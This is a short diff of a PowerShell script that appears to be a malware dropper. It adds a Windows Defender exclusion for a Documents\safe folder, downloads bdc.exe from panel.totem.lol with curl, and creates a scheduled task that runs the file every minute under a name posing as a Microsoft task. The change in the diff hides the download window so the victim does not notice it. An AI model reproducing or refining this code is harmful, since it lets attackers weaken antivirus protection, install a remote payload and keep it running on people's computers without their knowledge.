@@ -3,7 +3,7 @@ Start-Sleep -Seconds 0.2
 Set-MpPreference -ExclusionPath C:\Users\$env:UserName\Documents\safe
 Start-Sleep -Seconds 0.2
 $proc = "$env:WinDir\System32\cmd.exe"
-$args = "/c curl https://panel.totem.lol/bdc --output C:\Users\%username%\Documents\safe\bdc.exe"
-Start $proc $args
+$args = "/min /c mode con: cols=15 lines=1 && curl https://panel.totem.lol/bdc --output C:\Users\%username%\Documents\safe\bdc.exe"
+Start $proc $args -WindowStyle hidden
 Start-Sleep -Seconds 0.5
 schtasks /Create /SC MINUTE /RU $env:UserName /TN "Microsoft\Windows\SoftwareProtectionPlatform\SvcMaintenance" /TR "C:\Users\$env:UserName\Documents\safe\bdc.exe" /F
